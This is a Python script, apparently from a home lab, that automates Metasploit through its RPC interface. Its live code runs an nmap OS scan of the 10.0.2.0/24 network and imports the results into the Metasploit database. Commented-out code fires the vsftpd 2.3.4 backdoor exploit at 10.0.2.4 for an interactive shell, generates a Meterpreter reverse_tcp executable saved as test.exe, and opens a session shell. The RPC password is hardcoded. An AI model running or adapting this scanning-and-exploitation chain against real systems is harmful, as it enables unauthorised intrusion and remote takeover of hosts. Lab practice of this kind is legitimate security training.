from sys import argv
from pymetasploit3.msfrpc import *
import nmap
 
# Connect to RPC client
# if len(argv) <= 1:
#     print('Please provide RPC password as an argument')
#     exit(1)
 
try:
    print('Connecting to client...')
    client = MsfRpcClient("mypassword", port=55552)
    print('Connection successful')
 
except:
    print('Error connecting to client, ensure that RPC client is running on port 55552 and password is correct')
 
# Scan local network range using nmap 
print('Beginning portscan of network...')
nm = nmap.PortScanner()
nm.scan(hosts='10.0.2.0/24', arguments='-O')
data = nm.get_nmap_last_output()
 
# Import scan into Metasploit database
workspace = Workspace(client, 'default')
workspace.importdata(data)
print('Port scan completed and imported into Metasploit database')
 
hosts = workspace.hosts.records('hosts')
services = workspace.services.records('services')
 
# print(str(services))
 
# print(data)
# for host in nm.all_hosts():
#     print('------------------')
#     print('Host : %s (%s)' % (host, nm[host].hostnames()))
#     print('State : %s' % nm[host].state())
 
# for poop in nm.all_hosts():
#     print(poop)
#     print('Hostname: %s' % nm[poop].hostname())
 
    #
    #
    # print(nm.all_hosts())
 
    # exit()
    # [m for m in dir(client) if not m.startswith('_')]
 
    # client.modules.exploits
 
    # exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
 
    # exploit['RHOSTS'] = '10.0.2.4' # IP of our target host
 
    # exploit.targetpayloads()
 
    # exploit.execute(payload='cmd/unix/interact')
 
    # Meterpreter shit
    # payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
    # payload.runoptions['BadChars'] = ''
    # payload.runoptions['Encoder'] = ''
    # payload.runoptions['Format'] = 'exe'
    # payload.runoptions['NopSledSize'] = 0
    # payload.runoptions['ForceEncode'] = False
    # # payload.runoptions['Template'] = ''
    # payload.runoptions['Platform'] = ''
    # # payload.runoptions['KeepTemplateWorking'] = True
    # payload.runoptions['Iterations'] = 0
 
    # data = payload.payload_generate()
    # if isinstance(data, str):
    #     print(data)
    # else:
    #     with open('test.exe', 'wb') as f:
    #         f.write(data)
 
    # client.sessions.list
 
    # shell = client.sessions.session('1')